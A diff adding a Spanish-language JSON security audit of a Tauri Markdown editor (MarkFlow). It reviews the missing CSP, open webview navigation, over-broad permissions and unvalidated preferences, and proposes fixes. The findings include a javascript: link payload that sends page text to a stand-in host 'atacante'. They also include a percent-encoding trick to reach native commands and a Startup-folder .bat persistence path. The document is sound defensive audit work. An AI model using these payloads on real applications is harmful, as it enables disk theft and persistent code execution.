@@ -1,0 +1,172 @@
+{
+  "cazador": "configuracion-y-navegacion",
+  "unidades": ["U-11", "U-12", "U-08", "U-09"],
+  "metodo": "Solo lectura de codigo y configuracion. No se compilo, no se ejecuto, no se instalo nada, no se hizo ninguna peticion de red. Los hechos de plataforma se establecieron leyendo las fuentes FIJADAS por los lockfiles que ya estan en disco: tauri 2.11.5 y wry 0.55.1 (src-tauri/Cargo.lock) en el registro local de cargo, y @tauri-apps/api 2.11.1 en node_modules. Lo que depende del motor WebView2 en ejecucion queda marcado como necesita_validacion.",
+  "comprobaciones": [
+    {
+      "unidad": "U-11",
+      "que_revise": "csp: null (src-tauri/tauri.conf.json:27). Verificado en la fuente fijada de Tauri: manager/mod.rs:438-453 solo construye y emite la cabecera Content-Security-Policy si self.csp() devuelve Some; con csp null no se emite NINGUNA cabecera y tampoco corre la inyeccion de nonce/hash de set_csp (manager/mod.rs:53-106). O sea: la pagina de la aplicacion se sirve sin CSP, sin script-src y sin connect-src.",
+      "resultado": "candidato"
+    },
+    {
+      "unidad": "U-11",
+      "que_revise": "Que se gana un script que llegue al DOM. window.__TAURI__ queda expuesto por withGlobalTauri:true (tauri.conf.json:13), pero el hecho importante es otro: @tauri-apps/api 2.11.1 invoca por window.__TAURI_INTERNALS__.invoke (node_modules/@tauri-apps/api/core.js:202), que Tauri inyecta SIEMPRE. Poner withGlobalTauri en false NO cierra el puente. Con el puente abierto: invoke('leer',{ruta}) lee cualquier archivo UTF-8 del disco, invoke('escribir',{ruta,texto,finDeLinea}) escribe CUALQUIER ruta (lib.rs:86-112, sin restriccion a proposito), invoke('leer_imagen') lee cualquier archivo con extension de imagen hasta 25 MB, y sin CSP hay fetch() libre hacia cualquier origen para exfiltrar. Escribir en %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\x.bat es ejecucion de codigo persistente en el siguiente inicio de sesion.",
+      "resultado": "candidato"
+    },
+    {
+      "unidad": "U-11",
+      "que_revise": "assetProtocol enable:true con scope ['**'] (tauri.conf.json:28-33) + feature protocol-asset (Cargo.toml:21). Confirmado que NO se consume: no hay un solo convertFileSrc ni asset:// en src/ ni en index.html (las imagenes van por invoke('leer_imagen'), widgets.ts:190). Acota el riesgo: el manejador del protocolo responde con Access-Control-Allow-Origin igual al origen de la ventana (tauri-2.11.5/src/protocol/asset.rs:39), asi que una pagina remota cargada en el webview NO puede leer archivos por ahi. Queda como privilegio concedido sin consumidor.",
+      "resultado": "candidato"
+    },
+    {
+      "unidad": "U-11",
+      "que_revise": "Permisos de capabilities/default.json contra lo que el codigo llama de verdad, expandidos con src-tauri/gen/schemas/acl-manifests.json. Sin consumidor: opener:default entero (allow-open-url + allow-reveal-item-in-dir + allow-default-urls; el plugin se inicializa en lib.rs:201 y no hay un solo openUrl en src/), core:window:allow-set-title (no existe setTitle en src/; el titulo se pone con document.title, main.ts:164), dialog:allow-message (los dialogos los dibuja la propia aplicacion, main.ts:202-231). Ademas core:default arrastra familias enteras que la aplicacion nunca usa: core:menu (22 comandos), core:tray (12), core:image (incluye allow-from-path + allow-rgba, otra primitiva de lectura de disco), core:webview (incluye allow-internal-toggle-devtools), core:app, core:path, core:resources.",
+      "resultado": "candidato"
+    },
+    {
+      "unidad": "U-11",
+      "que_revise": "decorations:false (tauri.conf.json:22) y los ocho permisos de ventana que lo acompañan. No es un defecto por si mismo: allow-start-dragging y allow-internal-toggle-maximize los pide data-tauri-drag-region (index.html:15-27), y minimize/toggle-maximize/is-maximized/close/destroy se usan en main.ts:642-711. Si AMPLIFICA el candidato de navegacion: sin barra de titulo del sistema y sin barra de direcciones, una pagina remota que reemplace la aplicacion ocupa el marco entero sin ninguna señal de que ya no es MarkFlow.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-11",
+      "que_revise": "Empaquetado y cadena de publicacion: NSIS, installMode currentUser, sin certificateThumbprint ni signCommand, sin plugins.updater. package.json declara 20 dependencias directas de ejecucion y 3 de desarrollo; el arbol del lock tiene 232 paquetes y el unico con script de instalacion es fsevents (opcional, solo macOS, no se instala en Windows). package-lock.json y Cargo.lock estan versionados, asi que npm ci y cargo build son reproducibles; los rangos ^ solo flotan si alguien corre npm install. .gitignore cubre node_modules, dist, *.local (incluye .env.local) y migracion-zettlr/; src-tauri/.gitignore cubre /target/ y /gen/schemas. No hay .github/, o sea que no hay CI con secretos que auditar todavia.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-12",
+      "que_revise": "enriquecer() (src/widgets.ts:64-73). El escapado de & < > \" impide romper el atributo: una comilla del atacante llega como &quot; al texto crudo del HTML, asi que el valor del href no se puede cerrar antes de tiempo. Lo que NO valida es el ESQUEMA del destino: la regex de la linea 72 toma $2=[^)]+ tal cual y lo pone en href. El texto del .md llega crudo hasta ahi (livepreview.ts:176 corta el nodo Table y widgets.ts:96-98 hace celda.innerHTML = enriquecer(c)).",
+      "resultado": "candidato"
+    },
+    {
+      "unidad": "U-12",
+      "que_revise": "alPicar() (src/widgets.ts:20-27) y como llega el clic al ancla. La linea 22 devuelve temprano si el objetivo esta dentro de un a o un input, o sea que el enlace conserva su accion por omision. Detalle que importa para el arreglo: quitar la 'a' de ese closest() NO arreglaria nada, porque preventDefault() sobre mousedown no cancela la activacion de un ancla (eso solo evita foco, seleccion y arrastre); la navegacion la dispara el click. Y WidgetTabla no redefine ignoreEvent(), cuyo valor por omision en @codemirror/view es true, o sea que CodeMirror no se mete con el evento. El arreglo tiene que estar en enriquecer() y en la CSP, no en alPicar().",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-12",
+      "que_revise": "¿Hay manejador de navegacion? Establecido por codigo, no por suposicion: lib.rs:198-204 no llama on_navigation; Tauri instala igualmente un envoltorio (tauri-2.11.5/src/manager/webview.rs:577-605) que devuelve true salvo que un plugin diga lo contrario, y ni tauri-plugin-opener 2.5.5 ni tauri-plugin-dialog implementan on_navigation (grep sin resultados en sus fuentes). Wry solo engancha NavigationStarting cuando hay manejador (wry-0.55.1/src/webview2/mod.rs:674-695). Conclusion: toda navegacion se permite. Un [texto](https://…) en una celda saca la aplicacion de la ventana.",
+      "resultado": "candidato"
+    },
+    {
+      "unidad": "U-12",
+      "que_revise": "Hasta donde llega una pagina remota si la navegacion ocurre. Dos frenos confirmados en fuente, que ACOTAN el impacto y conviene no exagerar: (1) la capacidad default.json no declara 'remote', y la autoridad de Tauri solo casa Origin::Remote con un patron de URL declarado (tauri-2.11.5/src/ipc/authority.rs:57-67), asi que la pagina remota NO puede invocar los comandos aunque reciba los scripts de inicializacion; (2) el protocolo asset responde con ACAO = origen de la ventana (protocol/asset.rs:39), asi que tampoco puede leer archivos por ahi. El daño de la navegacion es perdida de trabajo y suplantacion, no lectura de disco.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-12",
+      "que_revise": "¿Hay otras anclas en la aplicacion? No: el unico <a> del frontend lo produce widgets.ts:72 (grep de href/createElement('a') en src/ e index.html solo devuelve los dos <link> de hojas de estilo). Fuera de las tablas, livepreview.ts:273-280 solo OCULTA la URL del enlace, no crea ancla. El otro sumidero de HTML, el SVG de Mermaid (widgets.ts:303), puede traer anclas propias pero es F3 y pertenece a otra unidad; no lo reclamo.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-08",
+      "que_revise": "onDragDropEvent (src/main.ts:716-725). Las rutas de ev.payload.paths se abren tal cual, en bucle secuencial: no hay comprobacion de extension, ni de cantidad, ni de tamaño, ni lista blanca de carpetas. El unico control real es el del nucleo: leer() exige UTF-8 (lib.rs:50-55), asi que un binario se rechaza con mensaje de error. El dialogo nativo si filtra extensiones (archivo.ts:16), pero ese filtro es comodidad de interfaz y el arrastre no pasa por ahi. Frontera: quien elige lo que se suelta es la propia victima, asi que no hay principal de menor confianza cruzando nada. No es candidato.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-08",
+      "que_revise": "Que pasa con 500 archivos de golpe. El tope de pestañas es 30 (pestanas.ts:41) y se comprueba DENTRO de abrirRuta (main.ts:344), no en el bucle. Las 30 primeras abren pestaña; de ahi en adelante cada ruta llama avisoTope() -> avisar() (main.ts:128-136, 212-231), que devuelve una promesa que solo se resuelve cuando el usuario pica Aceptar o pulsa Enter/Escape. Como el bucle hace await por archivo, soltar 500 archivos obliga a 470 cierres manuales seguidos, sin forma de cancelar. Si los archivos no son UTF-8 (una carpeta de fotos, por ejemplo) ni siquiera se llega al tope: son 500 dialogos de error, uno por archivo (main.ts:373-376). Molestia real, iniciada por la victima: endurecimiento, no vulnerabilidad.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-08",
+      "que_revise": "Tamaño. leer() hace fs::read completo sin tope (lib.rs:42) — el tope de 25 MB es solo de leer_imagen (lib.rs:116,148) — y despues copia a String y otra vez en el replace de CRLF antes de serializar al webview. Soltar un .txt de varios GB se traga varias veces su tamaño en RAM. Pertenece a la unidad de lib.rs, no a esta; lo anoto porque el arrastre es la via mas facil de llegar ahi sin querer.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-09",
+      "que_revise": "Contaminacion de prototipo por __proto__ en markflow.preferencias. NO ocurre: JSON.parse crea __proto__ como propiedad propia y la propagacion por spread de preferencias.ts:109 usa CreateDataProperty, que DEFINE una propiedad propia en vez de invocar el setter de Object.prototype. El objeto resultante lleva un __proto__ propio inerte; Object.prototype no se toca. Tampoco hay merge recursivo ni asignacion por ruta en ningun lado.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-09",
+      "que_revise": "Inyeccion de CSS por --fuente-texto, que era la sospecha explicita. NO se puede: preferencias.ts:136-137 no usa el valor guardado, lo usa como CLAVE de busqueda en FUENTES_TEXTO/FUENTES_MONO y cae a la pila del sistema si no casa (?? PILA_SISTEMA_TEXTO). Un valor como \"12px; background: url(https://atacante/x)\" nunca llega a setProperty: find() devuelve undefined y se escribe la pila de fabrica. La lista blanca ya estaba puesta.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-09",
+      "que_revise": "Inyeccion de CSS por los campos numericos, que si se interpolan crudos: --cuerpo = `${p.tamano}px`, --interlineado = String(p.interlineado), --ancho-columna = `${p.ancho}rem` (preferencias.ts:140-142). Tres frenos, todos verificados: (1) setProperty rechaza un valor de propiedad personalizada con punto y coma de primer nivel o llaves sin cerrar, asi que no se puede abrir una declaracion nueva; (2) p.ancho pasa antes por `> 0`, que descarta cualquier cadena no numerica; (3) lo unico que queda —meter un url() valido como token— no llega a ninguna propiedad que lo pida: las cuatro variables solo se consumen en font-size, font-family, line-height y max-width (src/tema.ts:14,19,20,27,40) y styles.css no tiene NI UN url() en todo el archivo. Un url() en --cuerpo deja la declaracion invalida en tiempo de valor calculado y no genera peticion. Sin inyeccion de CSS y sin baliza de red.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-09",
+      "que_revise": "Tipos equivocados y numeros extremos. tamano/interlineado con cadenas o numeros enormes o negativos producen valores CSS invalidos que el motor ignora (no rompen); modo con basura solo deja paneles.className = 'paneles modo-<basura>' (main.ts:393), cosmetico; imagenesRemotas y reabrir se leen como booleanos truthy, o sea que una cadena \"false\" enciende las imagenes remotas — pero quien pueda escribir ahi escribiria true directamente, asi que la confusion de tipos no aporta nada. Anidamiento profundo: el RangeError de JSON.parse lo atrapa el try de preferencias.ts:104-112 y cae a fabrica.",
+      "resultado": "limpio"
+    },
+    {
+      "unidad": "U-09",
+      "que_revise": "profundidad fuera de la enumeracion. PROFUNDIDAD[p.profundidad] (preferencias.ts:146) queda undefined y la linea 147 lanza TypeError al leer t.papel. Se llega desde main.ts:29, en el cuerpo del modulo, ANTES de crear el editor y de registrar un solo escuchador. Es el unico camino de las preferencias que no degrada: rompe.",
+      "resultado": "candidato"
+    },
+    {
+      "unidad": "U-09",
+      "que_revise": "Estado de seguridad guardado sin validar: imagenesRemotas (la decision de privacidad declarada en preferencias.ts:37-47) y reabrir+ultimoArchivo, que en main.ts:735-738 hacen que el programa abra solo una ruta elegida por quien escribio localStorage. Quien puede escribir ese almacen es un script del propio webview o un proceso local de la misma cuenta, que ya tiene autoridad sobre los archivos del usuario; la ganancia es de persistencia, no de privilegio. Endurecimiento.",
+      "resultado": "limpio"
+    }
+  ],
+  "candidatos": [
+    {
+      "titulo": "Enlace javascript: en celda de tabla: un clic ejecuta codigo en el origen de la aplicacion, con el puente nativo abierto y sin CSP que lo pare",
+      "unidad": "U-12",
+      "archivo": "src/widgets.ts",
+      "linea": 72,
+      "duplicado_de": "auditoria/caza/html.json, candidato U-01 (mismo origen de fallo, widgets.ts:72). NO contar dos veces. Esta entrada aporta tres cosas que alli faltaban o estaban al reves: (a) la restriccion [^)]+ NO impide los parentesis, (b) los hechos de plataforma confirmados en la fuente fijada de Tauri, (c) la cadena de CSP concreta.",
+      "frontera_violada": "F2/F13: el contenido de un .md de tercero es dato sin ninguna autoridad y no debe convertirse en URL ejecutable dentro del origen de la aplicacion. enriquecer() defiende el LIMITE del atributo (escapa & < > \") pero no valida el ESQUEMA del destino.",
+      "entrada_del_atacante": "El .md entero, que llega por doble clic (asociacion de .md declarada en tauri.conf.json:48-61) o por arrastre. Basta una tabla con una celda: '| Plantilla oficial | [Descargar](javascript:PAYLOAD) |'. Correccion importante sobre el analisis de html.json: la captura [^)]+ prohibe el parentesis LITERAL, no el parentesis. Un URL javascript: se percent-decodifica antes de evaluarse, asi que %28 y %29 lo restituyen y invoke(...) es alcanzable en una sola URL; y ademas hay carga util sin parentesis de ningun tipo, por ejemplo javascript:location='https://atacante/'+document.body.innerText. El escapado tampoco estorba: &quot;, &lt;, &gt; y &amp; vuelven a \" < > & al parsear el atributo, asi que la carga util es texto libre salvo el ')' y el '|' de la celda.",
+      "cadena_hasta_el_impacto": "1) livepreview.ts:174-184 detecta el nodo Table y pasa el texto CRUDO a WidgetTabla. 2) widgets.ts:96-98 parte las celdas y hace celda.innerHTML = enriquecer(c). 3) widgets.ts:72 emite <a href=\"javascript:…\" rel=\"noreferrer\"> con el destino sin validar. 4) widgets.ts:22: alPicar devuelve temprano si el clic cae dentro de un <a>, de modo que el ancla conserva su accion por omision (y quitar esa excepcion no ayudaria: preventDefault sobre mousedown no cancela la activacion del ancla). 5) La victima pica el enlace — picar un enlace de una tabla es exactamente lo que se espera de un lector de Markdown, y styles.css:455 lo pinta como enlace. 6) [PASO QUE DEPENDE DEL MOTOR, no ejecutado en esta corrida] WebView2 evalua el href javascript: en el documento actual; lo unico que podria impedirlo es una directiva script-src, y no hay ninguna: confirmado en tauri-2.11.5/src/manager/mod.rs:438-453, con csp null no se emite cabecera CSP. Ojo con el arreglo: wry solo engancha NavigationStarting (wry-0.55.1/src/webview2/mod.rs:674-695) y un URL javascript: no es una navegacion, asi que un on_navigation NO tapa este caso. 7) Ya ejecutando en http://tauri.localhost: window.__TAURI_INTERNALS__.invoke (presente siempre; window.__TAURI__ ademas por withGlobalTauri:true, tauri.conf.json:13) alcanza los cinco comandos. invoke('escribir',{ruta,texto,finDeLinea}) escribe CUALQUIER ruta (lib.rs:86-112) — por ejemplo un .bat en la carpeta de Inicio del usuario, que es ejecucion de codigo en el siguiente inicio de sesion — e invoke('leer') mas fetch() (sin connect-src) sacan cualquier archivo UTF-8 de la cuenta.",
+      "impacto": "Un .md ajeno mas un clic = lectura y escritura arbitraria del disco con la autoridad completa de la cuenta de Windows, exfiltracion por red sin restriccion y persistencia trivial (Inicio, perfil de PowerShell, cualquier script del usuario). Es el peor resultado posible para este programa: la victima creia estar leyendo una nota.",
+      "severidad": "critica",
+      "confianza": "necesita_validacion",
+      "arreglo_minimo": "Dos lineas, las dos hacen falta. (1) En src/widgets.ts:72, lista blanca de esquema antes de emitir el ancla: .replace(/\\[([^\\]]+)\\]\\(([^)]+)\\)/g, (todo, txt, url) => /^(https?:|mailto:|#|\\.{0,2}\\/)/i.test(url.trim()) ? `<a href=\"${url}\" rel=\"noreferrer\">${txt}</a>` : todo) — el trim() es imprescindible porque el parser de URL descarta los controles y espacios iniciales. (2) En src-tauri/tauri.conf.json:27, sustituir \"csp\": null por: \"csp\": \"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; font-src 'self' data:; img-src 'self' data: https:; connect-src 'self' ipc: http://ipc.localhost; object-src 'none'; base-uri 'none'; form-action 'none'; frame-src 'none'; worker-src 'none'\". Con script-src 'self' un href javascript: deja de ejecutarse aunque el filtro (1) se olvide. Validacion del propietario, 30 segundos y sin riesgo: abrir un .md con la tabla '| a | [pica](javascript:document.title=%27X%27) |' y picar el enlace; si el titulo de la ventana cambia a X, queda confirmado."
+    },
+    {
+      "titulo": "Un enlace https en una tabla saca la aplicacion de su propia ventana: se pierde todo lo no guardado, sin aviso, y la pagina del atacante queda a pantalla completa sin barra de direcciones",
+      "unidad": "U-12",
+      "archivo": "src-tauri/src/lib.rs",
+      "linea": 198,
+      "frontera_violada": "F2 -> control de navegacion del webview: el destino de un enlace escrito por un tercero decide a donde va el UNICO webview de la aplicacion.",
+      "entrada_del_atacante": "Una celda de tabla con un enlace normal y corriente: '| Fuente | [ver el original](https://atacante/parecido-a-github) |'. No hace falta ningun esquema raro ni ningun truco: es el caso legitimo del enlace.",
+      "cadena_hasta_el_impacto": "1) Mismo camino que el candidato anterior hasta el ancla (livepreview.ts:176 -> widgets.ts:98 -> widgets.ts:72) y mismo paso por alPicar (widgets.ts:22). 2) lib.rs:198-204 no registra on_navigation. Tauri instala su propio envoltorio (tauri-2.11.5/src/manager/webview.rs:577-605) que devuelve true salvo que un plugin lo niegue, y ni tauri-plugin-opener 2.5.5 ni tauri-plugin-dialog implementan on_navigation. Nadie filtra. 3) El webview navega. No se dispara onCloseRequested (main.ts:701-712): eso es un evento de VENTANA, no de navegacion, y no hay autoguardado en el frontend (main.ts solo marca p.sucio en :38-43). Los buffers sucios de hasta 30 pestañas se van sin preguntar. 4) La pagina remota ocupa la ventana entera: decorations:false (tauri.conf.json:22) significa que no hay barra de titulo del sistema, y un webview de Tauri no tiene barra de direcciones ni boton de atras, asi que no queda ninguna señal de que eso ya no es MarkFlow. 5) Acotado, y confirmado en fuente: esa pagina NO hereda los comandos (capabilities/default.json no declara 'remote' y authority.rs:57-67 solo casa Origin::Remote con un patron declarado) ni puede leer disco por el protocolo asset (ACAO = origen de la ventana, protocol/asset.rs:39).",
+      "impacto": "Perdida silenciosa del trabajo no guardado de todas las pestañas — que es justo el recurso que el proyecto declara proteger primero — y una superficie de suplantacion de primera: la ventana sigue siendo 'MarkFlow' para el usuario mientras la pinta el atacante, sin barra de direcciones que lo desmienta. Sin ejecucion nativa.",
+      "severidad": "alta",
+      "confianza": "confirmada_por_codigo",
+      "arreglo_minimo": "En src-tauri/src/lib.rs, dentro del builder (linea 199), fijar un manejador que solo deje navegar dentro de la propia aplicacion: .on_navigation(|url| matches!(url.host_str(), Some(\"tauri.localhost\") | Some(\"localhost\"))) — 'localhost' es para el devUrl de tauri.conf.json:8. Y para que los enlaces sigan sirviendo, mandarlos al navegador del sistema desde el frontend con openUrl() de @tauri-apps/plugin-opener, que YA esta concedido (capabilities/default.json:10) e inicializado (lib.rs:201) y hoy no lo usa nadie: un escuchador de click delegado que intercepte a[href^=http] y llame openUrl. Eso arregla la navegacion y de paso le da consumidor al unico permiso concedido en vano."
+    },
+    {
+      "titulo": "Endurecimiento de la politica del webview: sin CSP, con el protocolo de recursos abierto a todo el disco y con permisos concedidos sin consumidor",
+      "unidad": "U-11",
+      "archivo": "src-tauri/tauri.conf.json",
+      "linea": 27,
+      "frontera_violada": "Ninguna por si solo: esto no es una vulnerabilidad, es el multiplicador que convierte cualquier ejecucion en el DOM en control total de la cuenta. Se reporta como endurecimiento porque el arreglo es barato y el riesgo residual es claro.",
+      "entrada_del_atacante": "No aplica directamente. Su efecto es que CUALQUIER via de ejecucion en el webview —la de U-12, o la que aparezca mañana en Mermaid, en KaTeX o en una dependencia— pasa de 'script en una caja' a 'lectura y escritura de todo el disco mas exfiltracion libre'.",
+      "cadena_hasta_el_impacto": "1) csp:null (tauri.conf.json:27) -> manager/mod.rs:438-453 no emite cabecera: sin script-src (nada impide javascript: ni inline), sin connect-src (fetch libre a cualquier origen), sin form-action ni base-uri. 2) withGlobalTauri:true (:13) expone window.__TAURI__; conviene saber que apagarlo NO cierra nada, porque @tauri-apps/api invoca por window.__TAURI_INTERNALS__.invoke (core.js:202), que Tauri inyecta siempre. 3) assetProtocol scope ['**'] (:28-33) + feature protocol-asset (Cargo.toml:21) publican http://asset.localhost/<cualquier ruta> dentro del webview sin que el codigo lo use jamas (cero convertFileSrc en src/). 4) capabilities/default.json concede opener:default (open_url a cualquier http/https y reveal_item_in_dir a cualquier ruta) sin un solo consumidor, core:window:allow-set-title sin setTitle en ningun lado, dialog:allow-message sin uso, y core:default arrastra core:menu, core:tray, core:image (con allow-from-path + allow-rgba, otra lectura de disco), core:webview y core:path/app/resources, ninguno usado.",
+      "impacto": "Riesgo residual concreto, incluso despues de arreglar U-12: cualquier futura ejecucion en el DOM conserva hoy fetch() a cualquier destino para exfiltrar, apertura de URL arbitrarias en el navegador del sistema (que ninguna CSP alcanza), y una segunda primitiva de lectura de disco por core:image. Con la CSP de abajo puesta, esa misma ejecucion queda sin script inline, sin javascript:, y con la exfiltracion reducida a lo que quepa en una URL de imagen https.",
+      "severidad": "media",
+      "confianza": "confirmada_por_codigo",
+      "arreglo_minimo": "(1) tauri.conf.json:27 -> \"csp\": \"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; font-src 'self' data:; img-src 'self' data: https:; connect-src 'self' ipc: http://ipc.localhost; object-src 'none'; base-uri 'none'; form-action 'none'; frame-src 'none'; worker-src 'none'\". Por que cada pieza: style-src necesita 'unsafe-inline' porque KaTeX escribe con setAttribute(\"style\",…) (3 sitios en katex.min.js) y Mermaid inserta elementos <style> (createElement(\"style\") en mermaid.js) — sin eso las formulas y los diagramas salen deformes; img-src necesita data: para lo que devuelve leer_imagen y https: para que siga vivo el permiso opt-in de imagenes remotas (widgets.ts:209-245); connect-src necesita http://ipc.localhost porque el IPC de Tauri 2 en Windows va por fetch a esa URL (scripts/core.js:13-20 y scripts/ipc-protocol.js:38); script-src NO necesita 'unsafe-inline' porque Tauri inyecta por su cuenta el nonce y los hash de sus propios scripts cuando hay CSP (manager/mod.rs:53-106) e index.html:9 solo carga un modulo externo. Si estorba en desarrollo (devUrl http://localhost:1420 con HMR), usar app.security.devCsp, que tiene precedencia (manager/mod.rs:377-379). (2) assetProtocol: \"enable\": false y quitar la feature protocol-asset de Cargo.toml:21 — no se usa. (3) capabilities/default.json: quitar opener:default (o dejarlo SOLO si se adopta el arreglo de navegacion del candidato anterior, y entonces reducirlo a opener:allow-open-url + opener:allow-default-urls, sin reveal-item-in-dir), quitar core:window:allow-set-title, y cambiar dialog:default por dialog:allow-open + dialog:allow-save. Sustituir core:default por la lista minima real (core:event:allow-listen, core:event:allow-unlisten, core:window:allow-minimize, allow-toggle-maximize, allow-is-maximized, allow-close, allow-destroy, allow-start-dragging, allow-internal-toggle-maximize) es lo correcto por privilegio minimo, pero eso si conviene probarlo en ejecucion: algun ayudante del API podria llamar a core:path o core:resources por dentro."
+    },
+    {
+      "titulo": "Preferencias envenenadas: un valor de 'profundidad' fuera de la enumeracion deja la aplicacion muerta al arrancar, en todos los arranques, sin nada en la interfaz que lo pueda deshacer",
+      "unidad": "U-09",
+      "archivo": "src/preferencias.ts",
+      "linea": 146,
+      "frontera_violada": "F10: lo que sale de localStorage se mezcla con los valores de fabrica sin validar tipos ni rangos (preferencias.ts:109) y se usa como si viniera de la propia aplicacion.",
+      "entrada_del_atacante": "La clave markflow.preferencias con, por ejemplo, {\"tema\":\"oscuro\",\"profundidad\":\"x\"}. La escribe cualquier script que haya conseguido ejecutarse en el webview (el candidato U-12, sin ir mas lejos) o cualquier proceso local de la misma cuenta que toque el perfil de WebView2. El 'tema':'oscuro' solo sirve para garantizar la rama; con el tema del sistema en oscuro basta con la profundidad.",
+      "cadena_hasta_el_impacto": "1) main.ts:26 llama prefs.leer(), que hace {...DE_FABRICA, ...JSON.parse(crudo)} sin validar (preferencias.ts:109). 2) main.ts:29 llama prefs.aplicar(P) en el cuerpo del modulo. 3) preferencias.ts:145 entra en la rama oscura; :146 PROFUNDIDAD[p.profundidad] es undefined; :147 lanza TypeError al leer t.papel. 4) La excepcion aborta la evaluacion del modulo: nada por debajo de main.ts:29 llega a correr — ni crearPar (:45), ni conectarOpciones (:730), ni un solo addEventListener. Queda la cascara de index.html, inerte. 5) El valor sigue en localStorage, asi que pasa igual en el siguiente arranque, y el boton de 'valores de fabrica' (main.ts:534) nunca se conecto. Recuperarlo exige borrar a mano la carpeta del perfil de WebView2. No se ejecuto nada: es lectura de codigo.",
+      "impacto": "Denegacion de servicio persistente del editor, irrecuperable desde la propia aplicacion. Como escalada por si sola vale poco (quien puede escribir ahi ya tiene la cuenta); su valor real es de persistencia despues de una ejecucion como la de U-12, y de robustez: el mismo fallo lo provoca sin atacante cualquier renombrado futuro de un valor de 'profundidad' o de 'paleta' sobre un perfil viejo.",
+      "severidad": "baja",
+      "confianza": "confirmada_por_codigo",
+      "arreglo_minimo": "Tapon inmediato de una linea en src/preferencias.ts:146: const t = PROFUNDIDAD[p.profundidad] ?? PROFUNDIDAD.normal. El arreglo de fondo, que vale la pena porque cierra de una vez toda la unidad: que leer() sanee campo por campo contra DE_FABRICA — para cada clave, quedarse con el valor guardado solo si su typeof coincide con el de fabrica y, en los enumerados (tema, profundidad, paleta, sangria, modo), solo si pertenece al conjunto; los numeros, ademas, acotados con Number.isFinite y un rango. Con eso caen tambien los efectos menores del resto de los campos (modo basura en className, imagenesRemotas encendido por una cadena, ultimoArchivo elegido por otro)."
+    }
+  ],
+  "endurecimiento": [
+    "U-08: poner tope a lo que se suelta y filtrar por extension en main.ts:722, y agrupar el aviso de tope en uno solo en vez de uno por archivo. Hoy soltar 500 archivos obliga a cerrar hasta 470 dialogos seguidos (o 500 si no son UTF-8), sin cancelar.",
+    "U-08: leer() no tiene tope de tamaño (lib.rs:42, fs::read completo) mientras leer_imagen si lo tiene (25 MB). Pertenece a la unidad de lib.rs; el arrastre es la via mas facil de tropezar con ello.",
+    "U-08: leer() descarta el BOM en silencio (lib.rs:46-48) y escribir() lo escribe sin el. Como el arrastre no comprueba extension, es facil soltar un .csv o un .ps1 marcado con BOM, editarlo y guardarlo: el archivo cambia en un byte que el usuario no pidio, justo la invariante que el proyecto declara primero. No lo reclamo como candidato: es comportamiento de lib.rs y necesita que el usuario guarde.",
+    "U-08: dos sueltas encadenadas mientras hay un dialogo abierto lanzan dos bucles asincronos que se intercalan en abrirRuta (activar / guardarEstadoVivo). No consegui establecer por lectura que produzca un estado incorrecto; queda como observacion sin resolver, no como hallazgo.",
+    "U-11: el instalador NSIS no va firmado y no hay actualizador. Al publicar como software libre eso significa que Windows enseñara SmartScreen a cada quien que lo instale, que nadie podra distinguir una descarga legitima de una recompilada con un .md hostil dentro, y que no existe canal para repartir el arreglo de U-12 cuando se publique. Lo barato y honesto para la primera version: publicar los hash SHA-256 junto a la release y firmar la etiqueta de git; la firma de codigo es otra conversacion (cuesta dinero).",
+    "U-11: 20 dependencias directas de ejecucion, 232 paquetes en el arbol, un solo script de instalacion (fsevents, opcional y de macOS). Mermaid es, con mucho, el que mas arbol y mas superficie aporta, y es ademas el unico sumidero de HTML que depende de la limpieza de un tercero (DOMPurify). Fijar las dependencias con npm ci en cualquier receta de publicacion, no npm install.",
+    "U-12: el SVG de Mermaid (widgets.ts:303) tambien puede traer anclas propias; es F3 y pertenece a otra unidad, pero si se adopta el manejador de navegacion del candidato 2, ese camino queda cubierto de paso.",
+    "U-09: imagenesRemotas es una decision de seguridad que vive en un almacen sin validar; reabrir + ultimoArchivo hacen que el programa abra al arrancar una ruta elegida por quien escriba ese almacen. El saneo de leer() lo cubre."
+  ]
+}
